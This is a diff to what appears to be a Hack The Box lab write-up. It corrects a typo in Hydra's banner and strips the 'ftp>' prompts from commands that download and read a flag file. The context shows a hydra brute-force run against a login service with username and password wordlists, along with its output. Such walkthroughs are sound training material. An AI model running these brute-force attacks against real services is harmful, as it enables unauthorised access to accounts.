@@ -56,7 +56,7 @@ Hackerpatel007_1@htb[/htb]$ hydra -L top-usernames-shortlist.txt -P 2023-200_mos
 ```
 
 ```
-Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejaki - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-30 06:25:33
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
@@ -246,9 +246,9 @@ ftp>
 List files, download `flag.txt`, and read it:
 
 ```bash
-ftp> ls
-ftp> get flag.txt
-ftp> !cat flag.txt
+ls
+get flag.txt
+!cat flag.txt
 ```
 
 ```
